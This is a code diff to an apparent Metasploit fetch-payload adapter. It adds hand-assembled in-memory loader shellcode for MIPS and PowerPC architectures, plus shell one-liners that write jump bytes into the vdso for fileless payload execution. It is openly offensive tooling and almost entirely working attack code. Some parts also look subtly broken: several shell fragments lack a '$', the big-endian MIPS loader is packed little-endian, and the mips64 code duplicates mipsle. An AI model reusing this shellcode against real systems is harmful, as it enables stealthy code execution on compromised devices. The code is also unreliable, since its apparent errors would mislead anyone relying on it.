@@ -382,15 +382,95 @@ module Msf::Payload::Adapter::Fetch
       ]
       payload = in_memory_loader_asm.pack("V*")
     when 'mips64'
-      puts 'Not implemented yet'
+      in_memory_loader_asm = [
+          0xfcffa0af, #0x1000:	sw	$zero, -4($sp)	0xfcffa0af
+          0xfcffbd27, #0x1004:	addiu	$sp, $sp, -4	0xfcffbd27
+          0x2020a003, #0x1008:	add	$a0, $sp, $zero	0x2020a003
+          0xfeff1924, #0x100c:	addiu	$t9, $zero, -2	0xfeff1924
+          0x27282003, #0x1010:	not	$a1, $t9	0x27282003
+          0x02110224, #0x1014:	addiu	$v0, $zero, 0x1102	0x02110224
+          0x0c000000, #0x1018:	syscall		0x0c000000
+          0x2528e003, #0x101c:	move	$a1, $ra	0x2528e003
+          0xfd0f0224, #0x1020:	addiu	$v0, $zero, 0xffd	0xfd0f0224
+          0x0c000000, #0x1024:	syscall		0x0c000000
+          0xbd0f0224, #0x1028:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
+          0x0c000000, #0x102c:	syscall		0x0c000000
+      ]
+      payload = in_memory_loader_asm.pack('V*')
     when 'mipsbe'
-      puts 'Not implemented yet'
+      in_memory_loader_asm = [
+          0xafa0fffc, #0x1000:	sw	$zero, -4($sp)	0xafa0fffc
+          0x27bdfffc, #0x1004:	addiu	$sp, $sp, -4	0x27bdfffc
+          0x03a02020, #0x1008:	add	$a0, $sp, $zero	0x03a02020
+          0x2419fffe, #0x100c:	addiu	$t9, $zero, -2	0x2419fffe
+          0x03202827, #0x1010:	not	$a1, $t9	0x03202827
+          0x24021102, #0x1014:	addiu	$v0, $zero, 0x1102	0x24021102
+          0x0000000c, #0x1018:	syscall		0x0000000c
+          0x03e02825, #0x101c:	move	$a1, $ra	0x03e02825
+          0x24020ffd, #0x1020:	addiu	$v0, $zero, 0xffd	0x24020ffd
+          0x0000000c, #0x1024:	syscall		0x0000000c
+          0x24020fbd, #0x1028:	addiu	$v0, $zero, 0xfbd	0x24020fbd
+          0x0000000c, #0x102c:	syscall		0x0000000c
+      ]
+      payload = in_memory_loader_asm.pack('V*')
     when 'mipsle'
-      puts 'Not implemented yet'
+      in_memory_loader_asm = [
+          0xfcffa0af, #0x1000:	sw	$zero, -4($sp)	0xfcffa0af
+          0xfcffbd27, #0x1004:	addiu	$sp, $sp, -4	0xfcffbd27
+          0x2020a003, #0x1008:	add	$a0, $sp, $zero	0x2020a003
+          0xfeff1924, #0x100c:	addiu	$t9, $zero, -2	0xfeff1924
+          0x27282003, #0x1010:	not	$a1, $t9	0x27282003
+          0x02110224, #0x1014:	addiu	$v0, $zero, 0x1102	0x02110224
+          0x0c000000, #0x1018:	syscall		0x0c000000
+          0x2528e003, #0x101c:	move	$a1, $ra	0x2528e003
+          0xfd0f0224, #0x1020:	addiu	$v0, $zero, 0xffd	0xfd0f0224
+          0x0c000000, #0x1024:	syscall		0x0c000000
+          0xbd0f0224, #0x1028:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
+          0x0c000000, #0x102c:	syscall		0x0c000000
+      ]
+      payload = in_memory_loader_asm.pack('V*')
     when 'ppc'
-      puts 'Not implemented yet'
+      in_memory_loader_asm = [
+          0x0000c039, #0x1000:	li	r14, 0	0x0000c039
+          0x0000c195, #0x1004:	stwu	r14, 0(r1)	0x0000c195
+          0x780b237c, #0x1008:	mr	r3, r1	0x780b237c
+          0x00008038, #0x100c:	li	r4, 0	0x00008038
+          0x68010038, #0x1010:	li	r0, 0x168	0x68010038
+          0x02000044, #0x1014:	sc		0x02000044
+          0x5d000038, #0x1018:	li	r0, 0x5d	0x5d000038
+          0x02000044, #0x101c:	sc		0x02000044
+          0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
+          0x02000044, #0x1024:	sc		0x02000044
+      ]
+      payload = in_memory_loader_asm.pack('N*')
     when 'ppc64'
-      puts 'Not implemented yet'
+      in_memory_loader_asm = [
+          0x39c00000, #0x1000:	li	r14, 0	0x39c00000
+          0x95c10000, #0x1004:	stwu	r14, 0(r1)	0x95c10000
+          0x7c230b78, #0x1008:	mr	r3, r1	0x7c230b78
+          0x38800000, #0x100c:	li	r4, 0	0x38800000
+          0x38000168, #0x1010:	li	r0, 0x168	0x38000168
+          0x44000002, #0x1014:	sc		0x44000002
+          0x3800005d, #0x1018:	li	r0, 0x5d	0x3800005d
+          0x44000002, #0x101c:	sc		0x44000002
+          0x3800001d, #0x1020:	li	r0, 0x1d	0x3800001d
+          0x44000002, #0x1024:	sc		0x44000002
+    ]
+      payload = in_memory_loader_asm.pack('N*')
+    when 'ppc64le'
+      in_memory_loader_asm = [
+          0x0000c039, #0x1000:	li	r14, 0	0x0000c039
+          0x0000c195, #0x1004:	stwu	r14, 0(r1)	0x0000c195
+          0x780b237c, #0x1008:	mr	r3, r1	0x780b237c
+          0x00008038, #0x100c:	li	r4, 0	0x00008038
+          0x68010038, #0x1010:	li	r0, 0x168	0x68010038
+          0x02000044, #0x1014:	sc		0x02000044
+          0x5d000038, #0x1018:	li	r0, 0x5d	0x5d000038
+          0x02000044, #0x101c:	sc		0x02000044
+          0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
+          0x02000044, #0x1024:	sc		0x02000044
+      ]
+      payload = in_memory_loader_asm.pack('N*')
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
@@ -412,6 +492,18 @@ module Msf::Payload::Adapter::Fetch
       %^$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')"0"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"e3"^
     when 'armbe'
       %^"e30"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')""$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')^
+    when 'mipsle'
+      %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
+    when 'mipsbe'
+      %^"2409"$(echo (printf %04x $vdso_addr))"0120000800000000"^
+    when 'mips64'
+      %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
+    when 'ppc'
+     %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"0038a603087c2000804e"^ 
+    when 'ppc64'
+      %^"3800"$(echo (printf %04x $vdso_addr))"7c0803a64e800020"^
+    when 'ppc64le'
+     %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"0038a603087c2000804e"^ 
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
